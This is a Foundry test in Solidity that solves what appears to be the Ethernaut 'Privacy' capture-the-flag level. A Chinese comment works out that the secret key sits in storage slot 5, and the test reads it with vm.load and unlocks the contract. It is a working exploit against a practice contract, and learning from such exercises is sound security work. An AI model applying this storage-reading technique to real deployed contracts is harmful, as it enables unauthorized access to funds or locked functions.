pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Privacy.sol";


/** 
 * 解题思路：这道题与 Vault 类似，解决方法都是直接从 storage 中加载 private 数据，这里需要注意
 * - bool 类型是直接占据一个 slot
 * - ID 占据一个 slot
 * - flattening、denomination、awkwardness 占据一个 slot
 * - data 占据三个 slot
 * = 所以 data[2] 的 slot 下标就是 5
 */
contract HackPrivacyTest is Test {
    address hacker = address(hacker);
    Privacy public p;

    function setUp() public {
        vm.deal(hacker, 1 ether);
        bytes32[3] memory data = [bytes32("p1"), bytes32("p2"), bytes32("p3")];
        p = new Privacy(data);
    }
    function testHackPrivacy() public {
        //  加载 slot 5，获取密码
        bytes32 pwd = vm.load(address(p), bytes32(uint256(5)));
        p.unlock(bytes16(pwd));
        assert(p.locked() == false);
    }
}